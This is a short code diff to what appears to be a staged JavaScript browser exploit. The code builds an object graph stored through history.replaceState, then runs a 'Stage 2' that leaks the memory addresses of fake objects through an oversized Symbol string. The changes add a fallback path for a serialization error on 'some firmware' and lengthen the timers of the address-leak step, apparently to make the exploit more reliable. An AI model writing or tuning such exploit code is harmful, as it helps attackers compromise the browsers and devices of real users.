@@ -295,7 +295,15 @@ function storeHistoryGraph() {
   outerGraph[2] = referenceTarget;
   outerGraph[CONTROL_INDEX] = -64000;
  
-  history.replaceState(outerGraph, "");
+  try {
+    history.replaceState(outerGraph, "");
+  } catch (e) {
+    if (e.name !== "DataCloneError") throw e;
+    // BigInt can't serialize on some firmware - keep objects alive via the global reference instead
+    const safeOuter = outerGraph.slice();
+    safeOuter[0] = new Array(0xfffd).fill({});
+    try { history.replaceState(safeOuter, ""); } catch {}
+  }
 }
 
 // Stage 2: leak fakeHost and targetHolder through the oversized Symbol string.
@@ -312,8 +320,8 @@ function prepareAddressLeak() {
   getterCarrier[3] = targetHolder;
   preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
 
-  setTimeout(captureAddresses, 50);
-  setTimeout(finishAddressLeak, 100);
+  setTimeout(captureAddresses, 200);
+  setTimeout(finishAddressLeak, 350);
 }
 
 function captureAddresses() {
